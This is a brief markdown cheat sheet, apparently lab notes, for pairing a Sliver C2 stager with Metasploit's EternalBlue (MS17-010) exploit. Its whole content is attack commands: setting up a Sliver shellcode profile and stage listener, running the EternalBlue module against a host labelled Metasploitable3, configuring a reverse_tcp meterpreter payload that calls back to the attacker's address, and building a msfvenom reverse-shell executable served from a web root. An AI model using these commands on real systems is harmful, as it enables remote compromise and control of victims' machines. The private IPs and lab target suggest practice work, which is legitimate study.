# Sliver

## Set Up Sliver Stager - [Source](https://github.com/BishopFox/sliver/wiki/Stagers#example)
```
profiles new --profile-name win-shellcode --mtls 10.0.1.88 --format shellcode
stage-listener --url tcp://10.0.1.88:1234 --profile win-shellcode
# launch an mtls job for the final session
mtls
```

## EternalBlue
```
use exploit/windows/smb/ms17_010_eternalblue
# Metasploitable3 host
set RHOSTS 10.0.1.30 
```

## Payload Settings for Stager
```
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.1.88
set LPORT 1234
# this one is important so it doesn't try to launch another listener on the port we're already listening on!
set DisablePayloadHandler true 
```

## Manual stager running
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.1.88 LPORT=1234 -f exe -o /var/www/html/tcp-stager.exe
```